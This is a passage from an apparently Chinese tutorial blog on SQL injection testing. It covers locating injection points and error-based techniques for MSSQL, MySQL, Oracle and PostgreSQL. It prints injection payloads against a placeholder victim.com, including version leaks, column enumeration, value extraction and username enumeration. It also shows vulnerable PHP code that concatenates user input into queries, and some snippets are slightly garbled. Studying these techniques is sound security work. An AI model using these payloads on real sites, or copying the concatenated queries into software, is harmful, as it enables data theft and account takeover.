comment">--Oracle语句，列举当前用户可访问的所有表</span><span class="token keyword">SELECT</span> OWNER<span class="token punctuation">,</span> TABLE_NAME <span class="token keyword">FROM</span> ALL_TABLES <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> TABLE_NAME<span class="token punctuation">;</span> <span class="token comment">--MySQL语句，列举当前用户可访问的所有表和数据库</span><span class="token keyword">SELECT</span> table_schema<span class="token punctuation">,</span> table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">;</span><span class="token comment">--MSSQL语句，使用系统表列举所有可访问的表</span><span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> sysobjects <span class="token keyword">WHERE</span> xtype <span class="token operator">=</span> <span class="token string">'U'</span><span class="token punctuation">;</span><span class="token comment">--MSSQL语句，使用目录视图列举所有可访问的表</span><span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="SQL注入测试"><a href="#SQL注入测试" class="headerlink" title="SQL注入测试"></a>SQL注入测试</h2><h3 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h3><h4 id="借助推理进行测试"><a href="#借助推理进行测试" class="headerlink" title="借助推理进行测试"></a>借助推理进行测试</h4><h5 id="识别数据输入"><a href="#识别数据输入" class="headerlink" title="识别数据输入"></a>识别数据输入</h5><p>GET请求、POST请求、HTTP其他与数据库有交互的都可能存在注入，比如COOKIE注入。</p><h5 id="操纵参数"><a href="#操纵参数" class="headerlink" title="操纵参数"></a>操纵参数</h5><p><code>http://sql.com/index.php?id=1</code></p><p>这个<code>1</code>就是参数，这个参数是可以控制的，可以用来测试，比如<code>'</code></p><p>先将<code>id</code>改为一个不常见的参数，报错</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Warning: mysql_fetch_assoc <span class="token punctuation">(</span><span class="token punctuation">)</span> : supplied argument <span class="token operator">is</span> <span class="token operator">not</span> a valid MySQL result resource <span class="token operator">in</span> XXXX <span class="token keyword">on</span> line <span class="token number">34</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加一个单引号<code>http://sql.com/index.php?id=1'</code></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MySQL server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">''''</span> at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>还有一些其他的测试方法</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">在Oracle和PostgreSQL中的漏洞。向Web服务器发送下面两个请求：http:<span class="token comment">//www.victim.com/showproducts.php?category=bikes</span>http:<span class="token comment">//www.victim.com/showproducts.php?category=bi'||'kes</span>在Microsoft <span class="token keyword">SQL</span> Server中与之等价的请求为：http:<span class="token comment">//www.victim.com/showproducts.php?category=bikes</span>http:<span class="token comment">//www.victim.com/showproducts.php?category=bi'+'kes</span>在MySQL中与之等价的请求为（请注意两个单引号之间的空格）：http:<span class="token comment">//www.victim.com/showproducts.php?category=bikes</span>http:<span class="token comment">//www.victim.com/showproducts.php?category=bi''kes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="信息工作流"><a href="#信息工作流" class="headerlink" title="信息工作流"></a>信息工作流</h5><p><img src="https://images.dadream.eu.org/images/2024/07/264b07c0f1804dc008b15f081b391718.png"></p><h4 id="数据库错误"><a href="#数据库错误" class="headerlink" title="数据库错误"></a>数据库错误</h4><p>就是上文提到的报错</p><h5 id="常见的sql漏洞"><a href="#常见的sql漏洞" class="headerlink" title="常见的sql漏洞"></a>常见的sql漏洞</h5><h6 id="Sql-Server错误"><a href="#Sql-Server错误" class="headerlink" title="Sql Server错误"></a>Sql Server错误</h6><p>假设在victim.com应用中找到了一个名为showproducts.php的页面，页面脚本接收名为id 的参数并根据id参数的值显示单个商品：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/showproduct.aspx?id=2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果将id参数的值修改成下列内容：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/showproduct.aspx?id=attacker</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>应用会返回类似于下列内容的错误：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Server Error <span class="token operator">in</span> <span class="token string">'/'' Application.Invalid column name '</span>attacker<span class="token string">'.Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code. Exception Details: System.Data.SqlClient.SqlException: Invalid column name '</span>attacker'<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在这个错误的基础上，可以猜想第一个示例中应用创建的SQL语句应如下：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> products <span class="token keyword">WHERE</span> idproduct<span class="token operator">=</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上述语句返回的结果集是idproduct字段等于2时的商品。如果注入一个非数字值，比如 attacker,那么最终发送给数据库服务器的SQL语句将如下所示：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> products <span class="token keyword">WHERE</span> idproduct<span class="token operator">=</span>attacker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>这里mssql认为attacker不是一个数字，那么他就是个列名</strong></p><p>然后服务器从数据库中查找attacker列，没找到就返回了<code>Invalid column name 'attacker'.</code></p><p>这里的attacker就可以做文章</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/showproducts.aspx?category=bikes' and l=0/@@ version;--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>传入参数<code>' and 1=0/@@version;--</code></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Syntax error converting the nvarchar <span class="token keyword">value</span> <span class="token string">'Microsoft SQL Server 2000 - 8.00.760 (Intel X86) Dec 17 2002 14:22:05 Copyright (c) 1988 - 2003 Microsoft Corporation Enterprise Edition on Windows NT 5.2 (Build 3790:)'</span> <span class="token keyword">to</span> a <span class="token keyword">column</span> <span class="token keyword">of</span> <span class="token keyword">data</span> <span class="token keyword">type</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到这里的报错和上面是一个格式，错误信息展示了<code>@@version</code>查询的内容</p><p>原理：mssql的类型转换功能，<code>0/@@version</code>除法运算，sql将这两个操作数都作为操作数，将<code>@@version</code>当做数字解析，操作失败，将返回了这个错误。换成其他参数也是一个原理。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">还有一些技术可用于显示数据库执行的语句的信息，比如使用<span class="token keyword">having</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>：http:<span class="token comment">//www.victim.com/showproducts.aspx?category=bikes' having '1' ='1</span>应用响应如下：Server Error <span class="token operator">in</span> <span class="token string">'/'</span> Application<span class="token punctuation">.</span><span class="token keyword">Column</span> <span class="token string">'products.productid'</span> <span class="token operator">is</span> invalid <span class="token operator">in</span> the <span class="token keyword">select</span> list because it <span class="token operator">is</span> <span class="token operator">not</span> contained <span class="token operator">in</span> an aggregate <span class="token keyword">function</span> <span class="token operator">and</span> there <span class="token operator">is</span> <span class="token keyword">no</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> clause<span class="token punctuation">.</span>Description: An unhandled exception occurred during the execution <span class="token keyword">of</span> the <span class="token keyword">current</span> web request<span class="token punctuation">.</span> Please review the stack trace <span class="token keyword">for</span> more information about the error <span class="token operator">and</span> <span class="token keyword">where</span> it originated <span class="token operator">in</span> the code<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>having字句和group by 字句结合使用，在select中使用having过滤group by ，group by要求select语句选择的字段是某个聚合函数的结果，或者包含在group by 字句中，如果不满足，那么数据库返回一个错误，显示错误的第一列，该技术可以用来枚举表的列。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/showproducts.aspx?category=bikes' group by productid having '1' ='1</span><span class="token comment">#products.name</span>http:<span class="token comment">//www.victim.com/showproducts.aspx?category=bikes' group by productid,name having '1' ='1</span><span class="token comment">#products.price</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后用上面提到类型转换错误检索列对应的值</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/showproducts.aspx?category=bikes' and 1=0/name;--</span>Server Error <span class="token operator">in</span> <span class="token string">'/'</span> Application<span class="token punctuation">.</span>Syntax error converting the nvarchar <span class="token keyword">value</span> <span class="token string">'Claud Butler Olympus D2'</span> <span class="token keyword">to</span> a <span class="token keyword">column</span> <span class="token keyword">of</span> <span class="token keyword">data</span> <span class="token keyword">type</span> <span class="token keyword">int</span><span class="token punctuation">.</span>Description: An unhandled exception occurred during the execution <span class="token keyword">of</span> the <span class="token keyword">current</span> web request<span class="token punctuation">.</span> Please review the stack trace <span class="token keyword">for</span> more information about the error <span class="token operator">and</span> <span class="token keyword">where</span> it originated <span class="token operator">in</span> the code<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在身份验证机制中，可能枚举到用户名和密码的列，这样便可能登录有管理员权限的账号。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/logon.aspx?username=test' and User not in ('Admin') and l=0/User and '1' ='1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个payload将Admin用户排除，查找其他用户</p><p>关闭ASP.NET中服务器向远程访问者显示详细错误信息</p><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">web.config&lt;configuration&gt;&lt;system.web&gt;&lt;customErrors mode="Off"/&gt;&lt;/system.web&gt;&lt;/configuration&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置错误重定向</p><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;configuration&gt;&lt;system.web&gt;&lt;customErrorsdefaultRedirect="Error.aspx" mode="On"〉&lt;errorstatusCode="403H redirect='*AccessDenied.aspxn/&gt;&lt;errorstatusCode="404" redirect="NotFound.aspx"/&gt;&lt;errorstatusCode="500" redirect="InternalError.aspx"/&gt;&lt;/customErrors&gt;&lt;/system.web&gt;&lt;/configuration&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="Mysql错误"><a href="#Mysql错误" class="headerlink" title="Mysql错误"></a>Mysql错误</h6><p>常见错误代码</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Warning: mysql_fetch_array<span class="token punctuation">(</span><span class="token punctuation">)</span>: supplied argument <span class="token operator">is</span> <span class="token operator">not</span> a valid MySQL result resource <span class="token operator">in</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>victim<span class="token punctuation">.</span>com<span class="token operator">/</span>showproduct<span class="token punctuation">.</span>php <span class="token keyword">on</span> line <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个报错是<code>mysql_fetch_array()</code>产生的</p><p>mysql一般用<code>mysql_error()</code>来展示错误</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token prolog">&lt;?php//连接数据库 mysql_connect("[database]", "[user]", "[password]") or//检查错误，处理无法访问数据库的情况die("Could not connect: ".mysql_error());//选择数据库mysql_select_db("[database_name]");//从GET请求中获取category值$category = $_GET["category"];//创建并执行一条SQL语句$result = mysql_query("SELECT * from products where category='$category'")；if (!$result) { //如果有任何错误//检査错误并显示错误信息die("&lt;p&gt;Error: '.mysql_error().'&lt;/p&gt;');} else {//遍历査询结果while ($row = mysql_fetch_array($result.MYSQL_NUM)){printf ("ID: %s Name: %s", $row[0], $row[1]);}//释放结果集mysql_free_result($result);?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传入单引号做参数，报错，这是mysql_error()产生的</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Error: You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MySQL server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">''</span>' at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>传入一个不是字符串的（不在单引号内）作参数，便会被解析成列名，报错</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Error: Unknown <span class="token keyword">column</span> <span class="token string">'attacker'</span> <span class="token operator">in</span> <span class="token string">'where clause'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>和mssql有异曲同工之妙</p><h6 id="Oracle错误"><a href="#Oracle错误" class="headerlink" title="Oracle错误"></a>Oracle错误</h6><p>常见错误</p><p>执行了语法上不正确的SQL语句</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">java<span class="token punctuation">.</span><span class="token keyword">sql</span><span class="token punctuation">.</span>SQLException: ORA<span class="token operator">-</span><span class="token number">00933</span>: <span class="token keyword">SQL</span> command <span class="token operator">not</span> properly ended at oracle<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>dbaccess<span class="token punctuation">.</span>DBError<span class="token punctuation">.</span>throwSqlException<span class="token punctuation">(</span>DBError<span class="token punctuation">.</span>java:<span class="token number">180</span><span class="token punctuation">)</span> at oracle<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>ttc7<span class="token punctuation">.</span>TTIoer<span class="token punctuation">.</span>processError<span class="token punctuation">(</span>TTIoer<span class="token punctuation">.</span>java:<span class="token number">208</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Oracle数据库检测到SQL语句中有一个使用单引号引起来的字符串未被正确结束，Oracle要求字符串必须使用单引号结束。注入一个单引号时会发现产生了下列错误：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Error: SQLExceptionjava<span class="token punctuation">.</span><span class="token keyword">sql</span><span class="token punctuation">.</span>SQLException: ORA<span class="token operator">-</span><span class="token number">01756</span>: quoted string <span class="token operator">not</span> properly <span class="token keyword">terminated</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>.NET环境下的注入单引号情况：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Exception Details: System<span class="token punctuation">.</span><span class="token keyword">Data</span><span class="token punctuation">.</span>OleDb<span class="token punctuation">.</span>OleDbException: One <span class="token operator">or</span> more <span class="token keyword">errors</span> occurred during processing <span class="token keyword">of</span> command<span class="token punctuation">.</span>ORA<span class="token operator">-</span><span class="token number">00933</span>: <span class="token keyword">SQL</span> command <span class="token operator">not</span> properly ended<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>下面的例子展示了从.NET应用返回的一个错误，该程序执行的语句中包含未使用单引号 引起来的字符串：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ORA<span class="token operator">-</span><span class="token number">01756</span>: quoted string <span class="token operator">not</span> properly <span class="token keyword">terminated</span>System<span class="token punctuation">.</span>Web<span class="token punctuation">.</span>HttpUnhandledException: Exception <span class="token keyword">of</span> <span class="token keyword">type</span><span class="token string">'System.Web.HttpUnhandledException'</span> was thrown<span class="token punctuation">.</span><span class="token comment">--&gt;</span>System<span class="token punctuation">.</span><span class="token keyword">Data</span><span class="token punctuation">.</span>OleDb<span class="token punctuation">.</span>OleDbException: ORA<span class="token operator">-</span><span class="token number">01756</span>: quoted string <span class="token operator">not</span> properly <span class="token keyword">terminated</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>PHP的ociparse()函数用于准备要执行的Oracle语句。下面是该函数调用失败时PHP引擎 产生的一个错误示例：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Warning: ociparse <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token keyword">function</span><span class="token punctuation">.</span>ociparse<span class="token punctuation">]</span> : ORA<span class="token operator">-</span><span class="token number">01756</span>: quoted string <span class="token operator">not</span> properly <span class="token keyword">terminated</span> <span class="token operator">in</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>victim<span class="token punctuation">.</span>com<span class="token operator">/</span>ocitest<span class="token punctuation">.</span>php <span class="token keyword">on</span> line <span class="token number">31</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果ociparse()函数调用失败且未对该错误进行处理，那么应用会因为第一次失败而显示一 些其他错误，如下所示：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Warning: ociexecute<span class="token punctuation">(</span><span class="token punctuation">)</span>: supplied argument <span class="token operator">is</span> <span class="token operator">not</span> a valid OCI8<span class="token operator">-</span>Statement resource <span class="token operator">in</span> c:\www\victim<span class="token punctuation">.</span>com\oracle\<span class="token keyword">index</span><span class="token punctuation">.</span>php <span class="token keyword">on</span> line <span class="token number">31</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>分析报错代码</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">java<span class="token punctuation">.</span><span class="token keyword">sql</span><span class="token punctuation">.</span>SQLException: ORA<span class="token operator">-</span><span class="token number">00907</span>: missing <span class="token keyword">right</span> parenthesis atoracle<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>dbaccess<span class="token punctuation">.</span>DBError<span class="token punctuation">.</span>throwSqlException<span class="token punctuation">(</span>DBError<span class="token punctuation">.</span>java:<span class="token number">134</span><span class="token punctuation">)</span> at oracle<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>ttc7<span class="token punctuation">.</span>TTIoer<span class="token punctuation">.</span>processError<span class="token punctuation">(</span>TTIoer<span class="token punctuation">.</span>java:<span class="token number">289</span><span class="token punctuation">)</span> atoracle<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>ttc7<span class="token punctuation">.</span>Oall7<span class="token punctuation">.</span>receive<span class="token punctuation">(</span>Oall7<span class="token punctuation">.</span>java:<span class="token number">582</span><span class="token punctuation">)</span> atoracle<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>ttc7<span class="token punctuation">.</span>TTC7Protocol<span class="token punctuation">.</span>doOall7<span class="token punctuation">(</span>TTC7Protocol<span class="token punctuation">.</span>java:<span class="token number">1986</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>数据库报告SQL语句中存在”missing right parenthesis”(缺少右括号)错误。很多原因会引发该错误。最常见的情况是攻击者在嵌套SQL语句中拥有某种控制权。例如：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> fieldl<span class="token punctuation">,</span> field2<span class="token punctuation">,</span>    <span class="token comment">/* 选择第一和第二个字段 */</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> fieldl        <span class="token comment">/* 开始子查询 */</span><span class="token keyword">FROM</span> table2<span class="token keyword">WHERE</span> something <span class="token operator">=</span> <span class="token punctuation">[</span>attacker controlled variable<span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment">/* 结束子查询 */</span><span class="token keyword">as</span> field3                        <span class="token comment">/*从子査询返回*/</span><span class="token keyword">FROM</span> tablel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述例子展示了一个嵌套查询。主SELECT语句执行括号中的另一条SELECT语句。如果攻击者向第二条查询语句注入某些内容并将后面的SQL语句注释掉，那么Oracle将返回”missing right parenthesis” 错误。</p><h6 id="PostgreSQL错误"><a href="#PostgreSQL错误" class="headerlink" title="PostgreSQL错误"></a>PostgreSQL错误</h6><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//连接并选择数据库</span><span class="token variable">$dbconn</span> <span class="token operator">=</span> <span class="token function">pg_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"host=localhost dbname=books user=tom password=myPassword"</span><span class="token punctuation">)</span><span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Could not connect:'</span><span class="token operator">.</span><span class="token function">pg_last_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//执行SQL查询</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM \"public\".\"Authors\" WHERE name='<span class="token interpolation"><span class="token variable">$name</span></span>'"</span><span class="token punctuation">;</span> <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">pg_query</span><span class="token punctuation">(</span><span class="token variable">$dbconnz</span> <span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Query failed: '</span><span class="token operator">.</span><span class="token function">pg_last_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将查询结果以THTML形式输出</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;table&gt;\n"</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">pg_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">PGSQL_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\t&lt;tr&gt;\n"</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$line</span> <span class="token keyword">as</span> <span class="token variable">$col_value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\t\t&lt;td&gt;<span class="token interpolation"><span class="token variable">$col_value</span></span>&lt;/td&gt;\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\t&lt;/tr&gt;\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/table&gt;\n"</span><span class="token punctuation">;</span><span class="token comment">//释放结果集</span><span class="token function">pg_free_result</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭连接</span><span class="token function">pg_close</span><span class="token punctuation">(</span><span class="token variable">$dbconn</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>pg_query</code>使用传入的数据库执行sql查询语句</p><p><code>pg_last_error</code>获取数据库连接的最新出错信息</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/list_author.php?name='</span>Query failed: ERROR: unterminated quoted string at <span class="token operator">or</span> near <span class="token string">"''"</span><span class="token keyword">SQL</span>代码由于其他原因执行失败时<span class="token punctuation">,</span>PostgreSQL数据库将返回一个常规错误：Query failed: ERROR: syntax error at <span class="token operator">or</span> near <span class="token string">""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PostgreSQL开发，利用PostgreSQL JDBC Driver</p><p>PostgreSQL JDBC Driver处理缺少结束引号的字符串时，会有下面的报错</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">org<span class="token punctuation">.</span>postgresql<span class="token punctuation">.</span>util<span class="token punctuation">.</span>PSQLException: ERROR: unterminated quoted string at <span class="token operator">or</span> near <span class="token string">"'\' "</span>at org<span class="token punctuation">.</span>postgresql<span class="token punctuation">.</span>core<span class="token punctuation">.</span>v3<span class="token punctuation">.</span>QueryExecutorlmpl<span class="token punctuation">.</span>receiveErrorResponse<span class="token punctuation">(</span>Query ExecutorImpl<span class="token punctuation">.</span>java:<span class="token number">1512</span><span class="token punctuation">)</span>at org<span class="token punctuation">.</span>postgresql<span class="token punctuation">.</span>core<span class="token punctuation">.</span>v3<span class="token punctuation">.</span>QueryExecutorlmpl<span class="token punctuation">.</span>processResults<span class="token punctuation">(</span>QueryExecutorImpl<span class="token punctuation">.</span>java:<span class="token number">1297</span><span class="token punctuation">)</span>at org<span class="token punctuation">.</span>postgresql<span class="token punctuation">.</span>core<span class="token punctuation">.</span>v3<span class="token punctuation">.</span>QueryExecutorlmpl<span class="token punctuation">.</span><span class="token keyword">execute</span><span class="token punctuation">(</span>QueryExecutorlmpl<span class="token punctuation">.</span> java:<span class="token number">188</span><span class="token punctuation">)</span>at org<span class="token punctuation">.</span>postgresql<span class="token punctuation">.</span>jdbc2<span class="token punctuation">.</span>AbstractJdbc2Statement<span class="token punctuation">.</span><span class="token keyword">execute</span><span class="token punctuation">(</span>AbstractJdbc2Statement<span class="token punctuation">.</span>java:<span class="token number">430</span><span class="token punctuation">)</span>at org<span class="token punctuation">.</span>postgresql<span class="token punctuation">.</span>jdbc2<span class="token punctuation">.</span>AbstractJdbc2Statement<span class="token punctuation">.</span>executeWithFlags <span class="token punctuation">(</span>AbstractJdbc2Statement<span class="token punctuation">.</span>java:<span class="token number">332</span><span class="token punctuation">)</span>at org・postgresql<span class="token punctuation">.</span>jdbc2<span class="token punctuation">.</span>AbstractJdbc2Statement<span class="token punctuation">.</span>executeQuery<span class="token punctuation">(</span>AbstractJdbc2Statement<span class="token punctuation">.</span>java:<span class="token number">231</span><span class="token punctuation">)</span>at org<span class="token punctuation">.</span>postgresql<span class="token punctuation">.</span>jdbc2<span class="token punctuation">.</span>AbstractJdbc2DatabaseMetaData<span class="token punctuation">.</span>getTables <span class="token punctuation">(</span>AbstractJdbc2DatabaseMetaData<span class="token punctuation">.</span>java:<span class="token number">2190</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="应用程序的响应"><a href="#应用程序的响应" class="headerlink" title="应用程序的响应"></a>应用程序的响应</h5><h6 id="常见错误"><a href="#常见错误" class="headerlink" title="常见错误"></a>常见错误</h6><p>当注入一个页面一直返回相同的报错页面，这时候不能直接判断为SQL注入</p><p>注入代码</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span><span class="token keyword">FROM</span> products<span class="token keyword">WHERE</span> category<span class="token operator">=</span><span class="token string">'attacker'</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>返回一个报错页面，接着判断是否是sql注入产生的报错</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span><span class="token keyword">FROM</span> products<span class="token keyword">WHERE</span> category<span class="token operator">=</span><span class="token string">'attacker'</span> <span class="token operator">or</span> <span class="token string">'1'</span><span class="token operator">=</span>'<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>or '1'='1'</code>是一个条件永真式，并且是有意义的，不影响其他部分，可以返回表中的所有行，但是数据库大的时候，返回所有行会很久，这是可以注入</p><p><code>or '1'='2'</code>只要不影响sql语句就行</p><p>如果不返回报错页面了，那么应该就是sql注入引起的报错了</p><p>也可以用永假式<code>and '1'='1'</code>，如果不返回信息，则是sql注入，和永真相反</p><p>当然，永假式也可能返回信息，可能是<code>union</code>联合查询</p><h6 id="HTTP代码错误"><a href="#HTTP代码错误" class="headerlink" title="HTTP代码错误"></a>HTTP代码错误</h6><p>web服务器请求web源时发生错误，会返回500状态码</p><p>还一种是产生错误后302重定向到其他页面</p><h6 id="不同大小的响应"><a href="#不同大小的响应" class="headerlink" 